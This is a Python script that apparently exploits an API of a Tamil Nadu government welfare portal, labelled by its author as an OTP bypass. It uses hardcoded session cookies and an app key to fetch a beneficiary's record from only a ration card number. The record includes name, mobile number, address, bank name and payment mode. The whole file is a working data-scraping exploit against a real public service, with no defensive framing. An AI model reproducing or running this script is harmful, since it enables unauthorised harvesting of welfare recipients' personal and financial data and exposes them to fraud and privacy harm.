import requests

# Define the request headers and data
url = "https://kmutappeal.tnega.org/api/status_check_api/v1/official_search"
print("github.com/Harish-Srinivas-07")
headers = {
    "Host": "kmutappeal.tnega.org",
    "Cookie": "AWSALB=stRo+sKPsNHeWa4uKoTomEijOXttPfk6QZNorVyYCtHC4VmVmRwa63NEwj2Jc4HhikXI+UkgXu50rsKi/lRKZSH1lETH6ic2COGis8CIot2wDJ8QFyBzb0VNjeyf; AWSALBCORS=stRo+sKPsNHeWa4uKoTomEijOXttPfk6QZNorVyYCtHC4VmVmRwa63NEwj2Jc4HhikXI+UkgXu50rsKi/lRKZSH1lETH6ic2COGis8CIot2wDJ8QFyBzb0VNjeyf",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-App-Key": "km$ut_webp0rt@l",
    "X-App-Name": "KMUT WebPortal",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://kmutappeal.tnega.org",
    "Referer": "https://kmutappeal.tnega.org/status_check/index.html?data=NmRCcHJUNm5aT0NUV24vQWMzdUw3RzVrSGRIR3U4a1I4aiswMFFhbXM5ND0%3D&iv=ODA5MTk1MzQ0MDIyODczOQ%3D%3D",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Dnt": "1",
    "Sec-Gpc": "1",
    "user":"Harish-Srinivas-07",
    "Te": "trailers",
}
print("Kalaingar Magalir Urimai Thogai - Portal bypass otp\n---------------------------------------------------------------------------\n")
            
ufc_number = input("Enter Ration Number: ")  # Get UFC Number from the user

data = f"ufc_number={ufc_number}&case=getBenifiDetails"

try:
    response = requests.post(url, headers=headers, data=data)

    if response.status_code == 200:
        json_data = response.json()
        data = json_data.get("data")

        if data:
            application_name = data.get("application_name")
            pds_concat_name = data.get("pds_concat_name")
            application_id = data.get("application_id")
            ufc_no = data.get("ufc_no")
            mobile_no_application = data.get("mobile_no_application")
            main_category = data.get("main_category")
            reason = data.get("reason")
            shop_code = data.get("shop_code")
            address = data.get("address")
            mode_of_payment = data.get("mode_of_payment")
            bank_name = data.get("bank_name")

            print("Application Name:\t", application_name)
            print("PDS Concat Name:\t", pds_concat_name)
            print("Application ID:", application_id)
            print("UFC No:", ufc_no)
            print("Mobile No Application:", mobile_no_application)
            print("\nMain Category:\n",main_category)
            print("\nReason:\n", reason)
            print("\nShop Code:", shop_code)
            print("Address:", address)
            print("Mode of Payment:", mode_of_payment)
            print("Bank Name:", bank_name)
        else:
            print("Data not found in the response || check ration card number ")
    else:
        print(f"Request failed with status code: {response.status_code}")
except Exception as e:
    print(f"An error occurred: {str(e)}")

